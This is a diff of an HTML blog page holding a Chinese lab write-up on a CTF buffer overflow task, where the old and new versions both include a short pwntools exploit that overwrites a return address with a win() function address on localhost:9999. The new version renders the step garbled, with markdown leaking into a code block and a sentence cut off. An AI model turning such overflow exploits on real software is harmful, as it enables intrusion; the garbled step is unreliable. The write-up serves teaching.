@@ -99,7 +99,7 @@
 <meta property="og:image" content="http://libowei.net/image/网络攻防实验1-2.png">
 <meta property="og:image" content="http://libowei.net/image/网络攻防实验1-3.png">
 <meta property="og:image" content="http://libowei.net/image/网络攻防实验1-4.png">
-<meta property="og:updated_time" content="2017-03-31T09:13:01.850Z">
+<meta property="og:updated_time" content="2017-03-31T11:32:49.771Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="网络攻防实验(1)-缓冲区溢出">
 <meta name="twitter:description" content="题目说明说明：该题目由100、flag两个文件组成。100为可执行代码，存在缓冲区溢出漏洞。请同学们分析该程序的二进制代码找到漏洞成因，并通过修改程序的执行流程导致任意代码执行漏洞将flag中的FLAG信息输出出来。单机执行：请同学们在自己的机器上运行脚本：./host，9999端口即为程序输入端口。如果编写exploit攻击成功，会出现以下提示：{FLAG:this is a flag}">
@@ -424,10 +424,7 @@
 </li>
 <li><p>寻找要执行函数的地址。打开函数视图(view-&gt;subview-&gt;function)，找到win()函数：<br><img src="/image/网络攻防实验1-2.png" alt="win函数"><br>执行这个函数可以读出flag文件中内容。</p>
 </li>
-<li><p>寻找溢出点。在scanf函数后添加断点，调试程序。在程序中输入若干个’0’后，栈信息如下：<br><img src="/image/网络攻防实验1-3.png" alt="栈"><br>输入的’a’的ASCII码为0x30，栈中lose()函数的地址为0x08048634，向栈中填入64个字节即可覆盖到lose()的地址。</p>
-</li>
-<li><p>构造payload为 64字节字符+win()函数地址。本题中，执行host.sh脚本可将程序输入/输出重定向到9999端口,可使用pwntools编写exploit。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">conn=remote(<span class="string">'localhost'</span>,<span class="number">9999</span>)</div><div class="line">conn.send(<span class="string">'a'</span>*<span class="number">64</span>+p32(<span class="number">0x0804861B</span>))</div><div class="line">conn.interactive()</div></pre></td></tr></table></figure>
+<li><p>寻找溢出点。在scanf函数后添加断点，调试程序。在程序中输入若干个’0’后，栈信息如下：<br><img src="/image/网络攻防实验1-3.png" alt="栈"><br>输入的’a’的ASCII码为0x30，栈中lose()函数的地址为<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">4. 构造payload为 64字节字符+win()函数地址。本题中，执行host.sh脚本可将程序输入/输出重定向到9999端口,可使用pwntools编写exploit。</div><div class="line">```python</div><div class="line">from pwn import *</div><div class="line">conn=remote(&apos;localhost&apos;,9999)</div><div class="line">conn.send(&apos;a&apos;*64+p32(0x0804861B))</div><div class="line">conn.interactive()</div></pre></td></tr></table></figure></p>
 </li>
 </ol>
 <h2 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h2><p><img src="/image/网络攻防实验1-4.png" alt="实验结果"></p>
